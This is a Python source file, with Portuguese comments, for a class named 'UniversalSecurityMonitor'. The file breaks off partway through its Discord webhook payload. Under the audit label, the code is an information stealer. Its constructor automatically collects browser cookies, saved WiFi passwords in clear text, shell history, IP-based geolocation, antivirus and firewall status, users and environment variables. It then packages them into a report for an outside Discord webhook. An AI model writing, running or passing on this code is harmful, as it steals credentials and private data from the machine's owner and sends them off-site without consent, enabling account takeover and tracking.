import requests
import json
import socket
import platform
import psutil
from datetime import datetime
import os
import sys
import sqlite3
import shutil
import base64
import hashlib
import getpass
import subprocess
import re
import math
import uuid
import time
from pathlib import Path

# Importações condicionais para multiplataforma
try:
    import browser_cookie3
    BROWSER_SUPPORT = True
except ImportError:
    BROWSER_SUPPORT = False

try:
    from cryptography.fernet import Fernet
    CRYPTO_SUPPORT = True
except ImportError:
    CRYPTO_SUPPORT = False

try:
    import geocoder
    GEOLOCATION_SUPPORT = True
except ImportError:
    GEOLOCATION_SUPPORT = False

# Para Android Termux
try:
    import android
    ANDROID = True
except ImportError:
    ANDROID = False

# Para Windows
try:
    import winreg
    WINDOWS = True
except ImportError:
    WINDOWS = False

class UniversalSecurityMonitor:
    def __init__(self, webhook_url):
        self.webhook_url = webhook_url
        self.data = {}
        self.session_id = str(uuid.uuid4())
        self.platform = self.detect_platform()
        self.encryption_key = self.generate_key() if CRYPTO_SUPPORT else None
        self.has_root = self.check_root_privileges()
        self.collect_all_data()
    
    def check_root_privileges(self):
        """Verifica se o usuário tem privilégios de root/admin"""
        try:
            if self.platform in ["linux", "termux", "macos"]:
                # Verifica se é root no Unix-like
                if os.geteuid() == 0:
                    print("🔓 ROOT: Privilégios de root detectados")
                    return True
                else:
                    print("🔒 NON-ROOT: Executando sem privilégios de root")
                    return False
                    
            elif self.platform == "windows":
                # Verifica se é administrador no Windows
                try:
                    import ctypes
                    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                    if is_admin:
                        print("🔓 ADMIN: Privilégios de administrador detectados")
                    else:
                        print("🔒 NON-ADMIN: Executando sem privilégios de administrador")
                    return is_admin
                except:
                    return False
                    
            elif self.platform == "android":
                # No Android, verifica se tem root
                try:
                    result = subprocess.run(['su', '-c', 'id'], capture_output=True, text=True, timeout=5)
                    if 'uid=0' in result.stdout:
                        print("🔓 ROOT: Privilégios de root detectados no Android")
                        return True
                    else:
                        print("🔒 NON-ROOT: Android sem root")
                        return False
                except:
                    print("🔒 NON-ROOT: Android sem root (su não disponível)")
                    return False
                    
        except Exception as e:
            print(f"⚠️ Erro ao verificar privilégios: {e}")
            
        return False
        
    def detect_platform(self):
        """Detecta a plataforma específica"""
        system = platform.system().lower()
        if ANDROID:
            return "android"
        elif system == "windows":
            return "windows"
        elif system == "linux":
            if "termux" in os.environ.get('PREFIX', ''):
                return "termux"
            return "linux"
        elif system == "darwin":
            return "macos"
        else:
            return "unknown"
    
    def generate_key(self):
        """Gera uma chave de criptografia"""
        if CRYPTO_SUPPORT:
            return Fernet.generate_key()
        return None
    
    def encrypt_data(self, data):
        """Criptografa dados sensíveis"""
        if not CRYPTO_SUPPORT or not self.encryption_key:
            return str(data)
        
        fernet = Fernet(self.encryption_key)
        if isinstance(data, str):
            data = data.encode()
        return fernet.encrypt(data).decode()
    
    def safe_run_command(self, command, use_sudo=False, timeout=10):
        """Executa comandos de forma segura, respeitando privilégios"""
        if use_sudo and not self.has_root:
            return None, "No root privileges"
            
        try:
            if use_sudo and self.has_root:
                if isinstance(command, list):
                    command = ['sudo'] + command
                else:
                    command = f"sudo {command}"
                    
            result = subprocess.run(command, capture_output=True, text=True, 
                                  shell=isinstance(command, str), timeout=timeout)
            return result.stdout, None
        except subprocess.TimeoutExpired:
            return None, "Timeout"
        except Exception as e:
            return None, str(e)
    
    def collect_all_data(self):
        """Coleta todas as informações do sistema respeitando privilégios"""
        print(f"🔄 Coletando informações do sistema ({self.platform})...")
        print(f"🔐 Modo: {'ROOT/ADMIN' if self.has_root else 'USUÁRIO NORMAL'}")
        
        # Informações básicas (sempre disponíveis)
        self.collect_system_info()
        self.collect_network_info()
        self.collect_hardware_info()
        self.collect_security_info()
        self.collect_environment_info()
        
        # Informações sensíveis (dependem dos privilégios)
        self.collect_sensitive_data()
        
        # Informações específicas da plataforma
        self.collect_platform_specific_data()
    
    def collect_system_info(self):
        """Coleta informações do sistema operacional"""
        try:
            boot_time = datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
        except:
            boot_time = "N/A"
            
        self.data['system_info'] = {
            'platform': self.platform,
            'os': platform.system(),
            'version': platform.version(),
            'release': platform.release(),
            'architecture': platform.architecture(),
            'machine': platform.machine(),
            'processor': platform.processor(),
            'hostname': platform.node(),
            'username': getpass.getuser(),
            'boot_time': boot_time,
            'python_version': platform.python_version(),
            'session_id': self.session_id,
            'has_root': self.has_root
        }
    
    def collect_network_info(self):
        """Coleta informações de rede e localização"""
        self.data['public_ip'] = self.get_public_ip()
        self.data['local_ip'] = self.get_local_ip()
        self.data['location'] = self.get_detailed_location()
        self.data['network_interfaces'] = self.get_network_interfaces()
        self.data['connections'] = self.get_network_connections()
        self.data['dns_servers'] = self.get_dns_servers()
        self.data['network_stats'] = self.get_network_stats()
    
    def collect_hardware_info(self):
        """Coleta informações detalhadas de hardware"""
        try:
            cpu_freq = psutil.cpu_freq()
            cpu_freq_dict = cpu_freq._asdict() if cpu_freq else {}
        except:
            cpu_freq_dict = {}
            
        self.data['hardware'] = {
            'cpu_cores': psutil.cpu_count(),
            'cpu_physical_cores': psutil.cpu_count(logical=False),
            'cpu_frequency': cpu_freq_dict,
            'cpu_usage': psutil.cpu_percent(interval=1),
            'memory_total': self.format_bytes(psutil.virtual_memory().total),
            'memory_available': self.format_bytes(psutil.virtual_memory().available),
            'memory_used': self.format_bytes(psutil.virtual_memory().used),
            'memory_percent': psutil.virtual_memory().percent,
            'disk_partitions': self.get_disk_info(),
            'battery': self.get_battery_info(),
            'sensors': self.get_sensor_info(),
            'swap_memory': self.get_swap_info()
        }
    
    def collect_security_info(self):
        """Coleta informações de segurança"""
        self.data['security'] = {
            'antivirus': self.check_antivirus(),
            'firewall': self.check_firewall(),
            'users': self.get_system_users(),
            'processes': self.get_suspicious_processes(),
            'sudo_access': self.has_root,  # Usa a verificação já feita
            'system_updates': self.check_system_updates(),
            'open_ports': self.get_open_ports()
        }
    
    def collect_environment_info(self):
        """Coleta informações do ambiente"""
        self.data['environment'] = {
            'environment_variables': self.get_important_env_vars(),
            'running_services': self.get_running_services(),
            'installed_packages': self.get_installed_packages(),
            'system_uptime': self.get_system_uptime(),
            'logged_users': self.get_logged_users()
        }
    
    def collect_sensitive_data(self):
        """Coleta dados sensíveis respeitando privilégios"""
        try:
            sensitive_data = {}
            
            # Dados que funcionam sem root
            sensitive_data['browser_data'] = self.get_browser_data()
            sensitive_data['bash_history'] = self.get_bash_history()
            sensitive_data['system_info_files'] = self.get_system_info_files()
            
            # Dados que requerem root - só coleta se tiver privilégios
            if self.has_root:
                sensitive_data['wifi_passwords'] = self.get_wifi_passwords()
                sensitive_data['ssh_keys'] = self.get_ssh_keys()
            else:
                sensitive_data['wifi_passwords'] = {'info': 'Root required for WiFi passwords'}
                sensitive_data['ssh_keys'] = {'info': 'Root required for SSH keys access'}
            
            self.data['sensitive'] = sensitive_data
            
        except Exception as e:
            self.data['sensitive'] = {'error': str(e), 'warning': 'Alguns dados não puderam ser coletados'}
    
    def collect_platform_specific_data(self):
        """Coleta dados específicos da plataforma"""
        platform_data = {}
        
        if self.platform == "android":
            platform_data = self.get_android_specific_data()
        elif self.platform == "termux":
            platform_data = self.get_termux_specific_data()
        elif self.platform == "windows":
            platform_data = self.get_windows_specific_data()
        elif self.platform == "linux":
            platform_data = self.get_linux_specific_data()
        elif self.platform == "macos":
            platform_data = self.get_macos_specific_data()
            
        self.data['platform_specific'] = platform_data
    
    def get_public_ip(self):
        """Obtém IP público com múltiplos serviços de fallback"""
        services = [
            'https://api64.ipify.org?format=json',
            'https://api.ipify.org?format=json',
            'https://ipinfo.io/json',
            'https://ifconfig.me/all.json'
        ]
        
        for service in services:
            try:
                response = requests.get(service, timeout=10)
                if response.status_code == 200:
                    data = response.json()
                    return data.get('ip', data.get('ip_addr', 'N/A'))
            except:
                continue
                
        return "Não obtido"
    
    def get_local_ip(self):
        """Obtém IP local multiplataforma"""
        try:
            # Tenta conectar a um DNS público
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            try:
                # Fallback: obtém o hostname
                hostname = socket.gethostname()
                return socket.gethostbyname(hostname)
            except:
                return "Não obtido"
    
    def get_detailed_location(self):
        """Obtém localização detalhada com múltiplos serviços"""
        ip = self.data['public_ip']
        if ip == "Não obtido":
            return {'error': 'IP não disponível para geolocalização'}
        
        services = [
            f'http://ip-api.com/json/{ip}',
            f'https://ipinfo.io/{ip}/json',
            f'https://geolocation-db.com/json/{ip}'
        ]
        
        for service in services:
            try:
                response = requests.get(service, timeout=10)
                if response.status_code == 200:
                    location_data = response.json()
                    
                    if 'ip-api.com' in service and location_data.get('status') == 'success':
                        lat = location_data.get('lat')
                        lon = location_data.get('lon')
                        map_url = f"https://maps.google.com/?q={lat},{lon}" if lat and lon else "#"
                        
                        return {
                            'country': location_data.get('country', 'N/A'),
                            'region': location_data.get('regionName', 'N/A'),
                            'city': location_data.get('city', 'N/A'),
                            'zip': location_data.get('zip', 'N/A'),
                            'isp': location_data.get('isp', 'N/A'),
                            'coordinates': f"{lat}, {lon}" if lat and lon else "N/A",
                            'map_url': map_url,
                            'timezone': location_data.get('timezone', 'N/A'),
                            'service': 'ip-api'
                        }
                    elif 'ipinfo.io' in service:
                        loc = location_data.get('loc', '').split(',')
                        lat = loc[0] if len(loc) > 0 else None
                        lon = loc[1] if len(loc) > 1 else None
                        map_url = f"https://maps.google.com/?q={lat},{lon}" if lat and lon else "#"
                        
                        return {
                            'country': location_data.get('country', 'N/A'),
                            'region': location_data.get('region', 'N/A'),
                            'city': location_data.get('city', 'N/A'),
                            'zip': location_data.get('postal', 'N/A'),
                            'isp': location_data.get('org', 'N/A'),
                            'coordinates': location_data.get('loc', 'N/A'),
                            'map_url': map_url,
                            'timezone': location_data.get('timezone', 'N/A'),
                            'service': 'ipinfo'
                        }
            except Exception as e:
                continue
                
        return {'error': 'Localização não disponível'}
    
    def get_network_interfaces(self):
        """Obtém informações das interfaces de rede"""
        interfaces = {}
        try:
            for interface, addrs in psutil.net_if_addrs().items():
                interfaces[interface] = []
                for addr in addrs:
                    interfaces[interface].append({
                        'family': addr.family.name,
                        'address': addr.address,
                        'netmask': addr.netmask,
                        'broadcast': addr.broadcast
                    })
        except Exception as e:
            interfaces['error'] = str(e)
        return interfaces
    
    def get_network_connections(self):
        """Obtém conexões de rede ativas"""
        connections = []
        try:
            for conn in psutil.net_connections(kind='inet'):
                conn_info = {
                    'family': conn.family.name,
                    'type': conn.type.name,
                    'status': conn.status
                }
                
                if conn.laddr:
                    conn_info['local_address'] = f"{conn.laddr.ip}:{conn.laddr.port}"
                
                if conn.raddr:
                    conn_info['remote_address'] = f"{conn.raddr.ip}:{conn.raddr.port}"
                
                connections.append(conn_info)
        except Exception as e:
            connections.append({'error': str(e)})
            
        return connections[:15]  # Limita para não ficar muito grande
    
    def get_dns_servers(self):
        """Obtém servidores DNS configurados"""
        try:
            if self.platform == "windows":
                result = subprocess.check_output(['ipconfig', '/all'], text=True, shell=True)
                dns_servers = re.findall(r'DNS Servers[\.\s]*:\s*(\d+\.\d+\.\d+\.\d+)', result)
                return dns_servers
            else:
                # Tenta ler sem privilégios primeiro
                try:
                    with open('/etc/resolv.conf', 'r') as f:
                        content = f.read()
                        dns_servers = re.findall(r'nameserver\s+(\S+)', content)
                        return dns_servers
                except PermissionError:
                    # Fallback: usa comando que não requer root
                    try:
                        output = subprocess.check_output(['nmcli', 'dev', 'show'], text=True, stderr=subprocess.DEVNULL)
                        dns_servers = re.findall(r'DNS\[.*?\]:\s*(\S+)', output)
                        return dns_servers if dns_servers else ["Não disponível sem root"]
                    except:
                        return ["Não disponível sem root"]
        except:
            return ["Não disponível"]
    
    def get_network_stats(self):
        """Obtém estatísticas de rede"""
        try:
            stats = psutil.net_io_counters()
            return {
                'bytes_sent': self.format_bytes(stats.bytes_sent),
                'bytes_recv': self.format_bytes(stats.bytes_recv),
                'packets_sent': stats.packets_sent,
                'packets_recv': stats.packets_recv
            }
        except:
            return {'error': 'Estatísticas não disponíveis'}
    
    def get_disk_info(self):
        """Obtém informações dos discos"""
        partitions = []
        try:
            for partition in psutil.disk_partitions():
                try:
                    usage = psutil.disk_usage(partition.mountpoint)
                    partitions.append({
                        'device': partition.device,
                        'mountpoint': partition.mountpoint,
                        'fstype': partition.fstype,
                        'total_size': self.format_bytes(usage.total),
                        'used': self.format_bytes(usage.used),
                        'free': self.format_bytes(usage.free),
                        'percent_used': usage.percent
                    })
                except:
                    continue
        except Exception as e:
            partitions.append({'error': str(e)})
        return partitions
    
    def get_battery_info(self):
        """Obtém informações da bateria"""
        try:
            battery = psutil.sensors_battery()
            if battery:
                return {
                    'percent': battery.percent,
                    'power_plugged': battery.power_plugged,
                    'time_left': self.format_time(battery.secsleft) if battery.secsleft != psutil.POWER_TIME_UNLIMITED else "Indeterminado"
                }
        except:
            pass
        return {'percent': 'N/A', 'power_plugged': 'N/A'}
    
    def get_sensor_info(self):
        """Obtém informações de sensores"""
        sensors = {}
        try:
            if hasattr(psutil, "sensors_temperatures"):
                temps = psutil.sensors_temperatures()
                if temps:
                    sensors['temperatures'] = temps
                    
            if hasattr(psutil, "sensors_fans"):
                fans = psutil.sensors_fans()
                if fans:
                    sensors['fans'] = fans
        except:
            pass
        return sensors
    
    def get_swap_info(self):
        """Obtém informações da memória swap"""
        try:
            swap = psutil.swap_memory()
            return {
                'total': self.format_bytes(swap.total),
                'used': self.format_bytes(swap.used),
                'free': self.format_bytes(swap.free),
                'percent': swap.percent
            }
        except:
            return {'error': 'Informações de swap não disponíveis'}
    
    def get_browser_data(self):
        """Coleta dados dos navegadores (funciona sem root)"""
        browser_data = {}
        
        if not BROWSER_SUPPORT:
            return {'error': 'Suporte a navegadores não disponível'}
        
        try:
            # Chrome
            try:
                chrome_cookies = self.get_browser_cookies('chrome')
                if chrome_cookies:
                    browser_data['chrome'] = {
                        'cookies_count': len(chrome_cookies),
                        'sample_cookies': chrome_cookies[:3]
                    }
            except Exception as e:
                browser_data['chrome_error'] = str(e)
            
            # Firefox
            try:
                firefox_cookies = self.get_browser_cookies('firefox')
                if firefox_cookies:
                    browser_data['firefox'] = {
                        'cookies_count': len(firefox_cookies),
                        'sample_cookies': firefox_cookies[:3]
                    }
            except Exception as e:
                browser_data['firefox_error'] = str(e)
                
        except Exception as e:
            browser_data['global_error'] = str(e)
        
        return browser_data
    
    def get_browser_cookies(self, browser):
        """Obtém cookies do navegador especificado (funciona sem root)"""
        if not BROWSER_SUPPORT:
            return []
            
        try:
            if browser == 'chrome':
                return list(browser_cookie3.chrome())
            elif browser == 'firefox':
                return list(browser_cookie3.firefox())
            elif browser == 'edge':
                return list(browser_cookie3.edge())
            elif browser == 'opera':
                return list(browser_cookie3.opera())
        except:
            return []
    
    def get_wifi_passwords(self):
        """Obtém senhas WiFi salvas - apenas com root"""
        if not self.has_root:
            return {'info': 'Root privileges required for WiFi passwords'}
            
        passwords = []
        
        try:
            if self.platform == "windows":
                output = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], shell=True, text=True)
                profiles = re.findall(r'Perfil de Todos os Usuários\s*:\s*(.*)', output)
                
                for profile in profiles:
                    try:
                        profile_output = subprocess.check_output(
                            ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], 
                            shell=True, text=True, stderr=subprocess.DEVNULL
                        )
                        key_content = re.search(r'Conteúdo da Chave\s*:\s*(.*)', profile_output)
                        if key_content:
                            passwords.append({
                                'ssid': profile.strip(),
                                'password': key_content.group(1).strip()
                            })
                    except:
                        continue
                        
            elif self.platform in ["linux", "termux"]:
                try:
                    # Para sistemas com NetworkManager
                    output = subprocess.check_output(['nmcli', '-s', '-g', 'name,802-11-wireless-security.psk', 'connection', 'show'], 
                                                   text=True, stderr=subprocess.DEVNULL)
                    lines = output.strip().split('\n')
                    for line in lines:
                        if ':' in line:
                            ssid, password = line.split(':', 1)
                            if password and password != '--':
                                passwords.append({
                                    'ssid': ssid,
                                    'password': password
                                })
                except:
                    pass
                    
        except Exception as e:
            passwords.append({'error': str(e)})
        
        return passwords
    
    def get_ssh_keys(self):
        """Obtém chaves SSH do usuário (funciona sem root para chaves públicas)"""
        ssh_keys = {}
        ssh_dir = Path.home() / '.ssh'
        
        try:
            if ssh_dir.exists():
                for key_file in ssh_dir.glob('*'):
                    if key_file.is_file():
                        # Apenas lê chaves públicas e informações básicas sem root
                        if key_file.name.endswith('.pub') or key_file.name in ['known_hosts', 'config', 'authorized_keys']:
                            try:
                                stat = key_file.stat()
                                ssh_keys[key_file.name] = {
                                    'size': self.format_bytes(stat.st_size),
                                    'modified': datetime.fromtimestamp(stat.st_mtime).strftime("%Y-%m-%d %H:%M:%S"),
                                    'permissions': oct(stat.st_mode)[-3:],
                                    'type': 'public' if key_file.name.endswith('.pub') else 'config'
                                }
                            except:
                                continue
        except:
            pass
            
        return ssh_keys
    
    def get_bash_history(self):
        """Obtém histórico do bash (funciona sem root para usuário atual)"""
        try:
            bash_history_path = Path.home() / '.bash_history'
            if bash_history_path.exists():
                with open(bash_history_path, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = f.readlines()[-20:]  # Últimas 20 linhas
                    return [line.strip() for line in lines if line.strip()]
        except:
            pass
        
        # Tenta outros shells
        try:
            zsh_history_path = Path.home() / '.zsh_history'
            if zsh_history_path.exists():
                with open(zsh_history_path, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = f.readlines()[-20:]
                    return [line.strip() for line in lines if line.strip()]
        except:
            pass
            
        return []
    
    def get_system_info_files(self):
        """Coleta informações de arquivos do sistema (apenas leitura do usuário)"""
        info_files = {}
        important_files = [
            str(Path.home() / '.bashrc'),
            str(Path.home() / '.profile'),
            str(Path.home() / '.gitconfig'),
            str(Path.home() / '.ssh/config'),
            str(Path.home() / '.ssh/known_hosts')
        ]
        
        # Arquivos do sistema que podem ser lidos sem root
        if self.has_root:
            system_files = ['/etc/passwd', '/etc/hosts', '/etc/hostname']
            important_files.extend(system_files)
        
        for file_path in important_files:
            try:
                path = Path(file_path)
                if path.exists():
                    stat = path.stat()
                    info_files[file_path] = {
                        'exists': True,
                        'size': self.format_bytes(stat.st_size),
                        'modified': datetime.fromtimestamp(stat.st_mtime).strftime("%Y-%m-%d %H:%M:%S")
                    }
                else:
                    info_files[file_path] = {'exists': False}
            except PermissionError:
                info_files[file_path] = {'error': 'Permissão negada'}
            except:
                info_files[file_path] = {'error': 'Não acessível'}
                
        return info_files
    
    def check_antivirus(self):
        """Verifica software antivírus instalado - multiplataforma"""
        antivirus_list = []
        
        try:
            if self.platform == "windows":
                # Verifica processos comuns de antivírus
                av_processes = ['avast', 'avg', 'bitdefender', 'kaspersky', 'norton', 
                              'mcafee', 'defender', 'eset', 'trendmicro']
                
                for proc in psutil.process_iter(['name']):
                    proc_name = proc.info['name'].lower()
                    if any(av in proc_name for av in av_processes):
                        antivirus_list.append(proc.info['name'])
                        
            elif self.platform in ["linux", "termux"]:
                # Verifica processos de antivírus comuns no Linux
                av_processes = ['clamav', 'clamd', 'freshclam', 'rkhunter', 'chkrootkit']
                for proc in psutil.process_iter(['name']):
                    proc_name = proc.info['name'].lower()
                    if any(av in proc_name for av in av_processes):
                        antivirus_list.append(proc.info['name'])
                        
        except Exception as e:
            antivirus_list.append(f"Erro na verificação: {str(e)}")
        
        return antivirus_list if antivirus_list else ['Nenhum detectado']
    
    def check_firewall(self):
        """Verifica status do firewall - sem necessidade de root"""
        try:
            if self.platform == "windows":
                # Tenta verificar via PowerShell sem admin
                try:
                    output = subprocess.check_output([
                        'powershell', 
                        'Get-NetFirewallProfile | Select-Object Name, Enabled'
                    ], text=True, shell=True, stderr=subprocess.DEVNULL)
                    if 'True' in output:
                        return 'Ativado (parcial)'
                    else:
                        return 'Desativado ou status indeterminado'
                except:
                    return 'Status desconhecido'
                
            elif self.platform in ["linux", "termux"]:
                # Verifica via processos sem root
                firewall_processes = ['ufw', 'firewalld', 'iptables']
                for proc in psutil.process_iter(['name']):
                    if any(fw in proc.info['name'].lower() for fw in firewall_processes):
                        return f"{proc.info['name']} em execução"
                
                return 'Nenhum firewall ativo detectado'
                        
        except:
            pass
            
        return 'Status desconhecido'
    
    def get_system_users(self):
        """Obtém usuários do sistema (funciona sem root)"""
        users = []
        try:
            for user in psutil.users():
                users.append({
                    'name': user.name,
                    'terminal': user.terminal,
                    'host': user.host,
                    'started': datetime.fromtimestamp(user.started).strftime("%Y-%m-%d %H:%M:%S")
                })
        except:
            pass
        return users
    
    def get_suspicious_processes(self):
        """Identifica processos suspeitos (funciona sem root)"""
        suspicious = []
        suspicious_keywords = ['miner', 'backdoor', 'rootkit', 'keylogger', 'malware', 'trojan']
        
        try:
            for proc in psutil.process_iter(['pid', 'name', 'memory_percent', 'cpu_percent']):
                try:
                    proc_info = proc.info
                    # Processos usando muita memória ou CPU
                    if (proc_info['memory_percent'] > 15.0 or 
                        proc_info['cpu_percent'] > 50.0 or
                        any(keyword in proc_info['name'].lower() for keyword in suspicious_keywords)):
                        suspicious.append(proc_info)
                except:
                    continue
        except:
            pass
            
        return suspicious[:10]
    
    def check_system_updates(self):
        """Verifica atualizações do sistema sem root"""
        try:
            if self.platform == "windows":
                return "Verificar via Windows Update (admin requerido)"
            elif self.platform in ["linux", "termux"]:
                # Verifica baseado na distribuição sem root
                if os.path.exists('/etc/debian_version'):
                    try:
                        result = subprocess.run(['apt', 'list', '--upgradable'], 
                                              capture_output=True, text=True, timeout=30)
                        if result.returncode == 0:
                            lines = [line for line in result.stdout.split('\n') if line.startswith('/')]
                            return f"Debian/Ubuntu: {len(lines)} pacotes atualizáveis"
                        else:
                            return "Verificar via apt update (root requerido)"
                    except:
                        return "Verificação falhou"
                elif os.path.exists('/etc/redhat-release'):
                    return "Verificar via yum check-update (root requerido)"
        except:
            pass
        return "Verificação não disponível sem root"
    
    def get_open_ports(self):
        """Obtém portas abertas (funciona sem root)"""
        open_ports = []
        try:
            for conn in psutil.net_connections():
                if conn.status == 'LISTEN' and conn.laddr:
                    open_ports.append(conn.laddr.port)
        except:
            pass
        return list(set(open_ports))[:20]  # Remove duplicatas e limita
    
    def get_important_env_vars(self):
        """Obtém variáveis de ambiente importantes (sem root)"""
        env_vars = {}
        important_vars = ['PATH', 'HOME', 'USER', 'SHELL', 'TERM', 'LANG', 'TMPDIR', 
                         'PYTHONPATH', 'JAVA_HOME', 'ANDROID_HOME']
        
        for var in important_vars:
            if var in os.environ:
                env_vars[var] = os.environ[var]
                
        return env_vars
    
    def get_running_services(self):
        """Obtém serviços em execução (limitado sem root)"""
        services = []
        try:
            # Usa psutil para ver processos do sistema
            for proc in psutil.process_iter(['name', 'username']):
                try:
                    if proc.info['username'] in ['root', 'system', 'SYSTEM']:
                        services.append(proc.info['name'])
                except:
                    continue
                    
            services = list(set(services))[:15]  # Remove duplicatas e limita
        except:
            pass
            
        return services
    
    def get_installed_packages(self):
        """Obtém pacotes instalados (limitado sem root)"""
        packages = []
        try:
            if self.platform in ["linux", "termux"]:
                # Tenta obter pacotes do usuário atual
                user_packages = []
                
                # Python packages
                try:
                    result = subprocess.run([sys.executable, '-m', 'pip', 'list', '--user'], 
                                          capture_output=True, text=True)
                    user_packages.extend(result.stdout.split('\n')[:10])
                except:
                    pass
                    
                # Node packages
                try:
                    result = subprocess.run(['npm', 'list', '-g', '--depth=0'], 
                                          capture_output=True, text=True)
                    user_packages.extend(result.stdout.split('\n')[:5])
                except:
                    pass
                    
                packages = user_packages
        except:
            pass
            
        return packages
    
    def get_system_uptime(self):
        """Obtém tempo de atividade do sistema (sem root)"""
        try:
            boot_time = psutil.boot_time()
            uptime_seconds = time.time() - boot_time
            return self.format_time(uptime_seconds)
        except:
            return "N/A"
    
    def get_logged_users(self):
        """Obtém usuários logados (sem root)"""
        users = []
        try:
            for user in psutil.users():
                users.append(user.name)
        except:
            pass
        return list(set(users))
    
    def get_android_specific_data(self):
        """Coleta dados específicos do Android sem root"""
        android_data = {}
        try:
            # Comandos que funcionam sem root no Android/Termux
            android_data['device_model'] = subprocess.check_output(['getprop', 'ro.product.model'], text=True).strip()
            android_data['android_version'] = subprocess.check_output(['getprop', 'ro.build.version.release'], text=True).strip()
            
            # Informações do Termux
            if self.platform == "termux":
                try:
                    termux_info = subprocess.check_output(['termux-info'], text=True).strip()[:200]
                    android_data['termux_info'] = termux_info
                except:
                    pass
        except:
            pass
        return android_data
    
    def get_termux_specific_data(self):
        """Coleta dados específicos do Termux"""
        termux_data = {}
        try:
            termux_data['termux_version'] = subprocess.check_output(['termux-info'], text=True).strip()[:200]
        except:
            pass
        return termux_data
    
    def get_windows_specific_data(self):
        """Coleta dados específicos do Windows sem admin"""
        windows_data = {}
        try:
            # Comandos que funcionam sem admin
            windows_data['computer_name'] = platform.node()
            windows_data['windows_edition'] = f"{platform.system()} {platform.release()}"
            
            # Informações do sistema via wmic (funciona sem admin)
            try:
                cpu_info = subprocess.check_output(['wmic', 'cpu', 'get', 'name', '/value'], 
                                                 text=True, shell=True)
                windows_data['cpu_name'] = cpu_info.strip().split('=')[-1]
            except:
                pass
                
        except:
            pass
        return windows_data
    
    def get_linux_specific_data(self):
        """Coleta dados específicos do Linux sem root"""
        linux_data = {}
        try:
            # Informações que podem ser lidas sem root
            if os.path.exists('/etc/os-release'):
                with open('/etc/os-release', 'r') as f:
                    content = f.read()
                    # Apenas linhas básicas
                    for line in content.split('\n'):
                        if line.startswith(('NAME=', 'VERSION=', 'ID=')):
                            key, value = line.split('=', 1)
                            linux_data[key.lower()] = value.strip('"')
        except:
            pass
        return linux_data
    
    def get_macos_specific_data(self):
        """Coleta dados específicos do macOS sem root"""
        macos_data = {}
        try:
            # Comandos que funcionam sem root
            macos_data['sw_vers'] = subprocess.check_output(['sw_vers'], text=True).strip()
            
            # Hardware info básico
            try:
                hw_info = subprocess.check_output(['system_profiler', 'SPHardwareDataType'], 
                                                text=True).strip()[:300]
                macos_data['hardware_basic'] = hw_info
            except:
                pass
        except:
            pass
        return macos_data
    
    def format_bytes(self, bytes):
        """Formata bytes para formato legível"""
        if bytes == 0:
            return "0B"
        sizes = ["B", "KB", "MB", "GB", "TB"]
        i = int(math.floor(math.log(bytes, 1024)))
        p = math.pow(1024, i)
        s = round(bytes / p, 2)
        return f"{s} {sizes[i]}"
    
    def format_time(self, seconds):
        """Formata segundos para formato legível"""
        days = seconds // (24 * 3600)
        seconds = seconds % (24 * 3600)
        hours = seconds // 3600
        seconds %= 3600
        minutes = seconds // 60
        seconds %= 60
        
        parts = []
        if days > 0:
            parts.append(f"{int(days)}d")
        if hours > 0:
            parts.append(f"{int(hours)}h")
        if minutes > 0:
            parts.append(f"{int(minutes)}m")
        if seconds > 0 or not parts:
            parts.append(f"{int(seconds)}s")
            
        return " ".join(parts)
    
    def create_detailed_embed(self):
        """Cria embed detalhado para Discord"""
        location = self.data['location']
        system = self.data['system_info']
        hardware = self.data['hardware']
        security = self.data['security']
        environment = self.data['environment']
        
        # Define cor baseada nos privilégios
        embed_color = 0x00ff00 if self.has_root else 0xffa500  # Verde para root, laranja para não-root
        
        embed = {
            "title": f"🔍 RELATÓRIO DE SEGURANÇA - {system['platform'].upper()}",
            "color": embed_color,
            "timestamp": datetime.utcnow().isoformat(),
            "fields": [
                {
                    "name": "🔐 PRIVILÉGIOS",
                    "value": f"**Root/Admin:** {'✅ SIM' if self.has_root else '❌ NÃO'}\n**Usuário:** {system['username']}\n**Modo:** {'COMPLETO' if self.has_root else 'LIMITADO'}",
                    "inline": True
                },
                {
                    "name": "🌐 INFORMAÇÕES DE REDE",
                    "value": f"**IP Público:** `{self.data['public_ip']}`\n**IP Local:** `{self.data['local_ip']}`\n**DNS:** {len(self.data['dns_servers'])} servidores",
                    "inline": True
                },
                {
                    "name": "📍 LOCALIZAÇÃO",
                    "value": f"**País:** {location.get('country', 'N/A')}\n**Cidade:** {location.get('city', 'N/A')}\n**ISP:** {location.get('isp', 'N/A')}",
                    "inline": True
                },
                {
                    "name": "💻 SISTEMA",
                    "value": f"**OS:** {system['os']} {system['release']}\n**Hostname:** {system['hostname']}\n**Uptime:** {environment['system_uptime']}",
                    "inline": True
                },
                {
                    "name": "🖥️ HARDWARE",
                    "value": f"**CPU:** {hardware['cpu_cores']} cores ({hardware['cpu_usage']}%)\n**RAM:** {hardware['memory_used']}/{hardware['memory_total']}\n**Swap:** {hardware['swap_memory'].get('used', 'N/A')}",
                    "inline": True
                },
                {
                    "name": "🛡️ SEGURANÇA",
                    "value": f"**Antivírus:** {', '.join(security['antivirus'][:2])}\n**Firewall:** {security['firewall']}\n**Portas Abertas:** {len(security['open_ports'])}",
                    "inline": True
                }
            ],
            "footer": {
                "text": f"Security Audit • {system['platform']} • {'ROOT' if self.has_root else 'USER'} • {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}"
            }
        }
        
        # Adiciona informações específicas da plataforma
        if 'platform_specific' in self.data:
            platform_data = self.data['platform_specific']
            if platform_data:
                platform_info = "\n".join([f"**{k}:** {v}" for k, v in list(platform_data.items())[:2]])
                if platform_info:
                    embed['fields'].append({
                        "name": f"🔧 {system['platform'].upper()} ESPECÍFICO",
                        "value": platform_info,
                        "inline": False
                    })
        
        return embed
    
    def send_comprehensive_report(self):
        """Envia relatório completo para Discord"""
        try:
            embed = self.create_detailed_embed()
            
            privilege_status = "🔓 ROOT/ADMIN" if self.has_root else "🔒 USUÁRIO NORMAL"
            
            payload = {
                "embeds": [embed],
                "username": f"Security Monitor - {self.data['system_info']['platform']}",
                "avatar_url": "https://cdn-icons-png.flaticon.com/512/2489/2489073.png",
